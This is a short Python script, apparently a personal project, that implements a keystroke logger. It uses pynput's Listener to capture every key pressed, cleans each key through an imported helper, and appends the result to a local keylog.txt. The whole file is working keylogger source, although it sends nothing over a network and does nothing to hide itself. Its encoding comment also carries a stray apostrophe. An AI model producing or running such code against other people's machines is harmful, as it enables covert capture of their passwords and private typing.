# -*- cod'ing: utf-8 -*-
"""
Created on Wed Dec  6 17:56:56 2023

@author: Cade Browning
"""

from pynput.keyboard import Listener
from key_cmds import KeyInput

def write_key(key):
    """
    creates a key logger and uses the KeyLogger function from key_cmds.py to remove the 
        instances of special keys, such as Key.space, Key.Shift, etc. The value from the keylogger 
        is then stored into keylog.txt
    Parameters
    ----------
    key : TYPE str
        the value coming from Listener that is then being run through the KeyInput function

    Returns
    -------
    None.
    """
    k_value = KeyInput(key)
    with open("keylog.txt", 'a') as f:
        f.write(k_value)
        
with Listener(on_press=write_key) as lis:
    lis.join()
    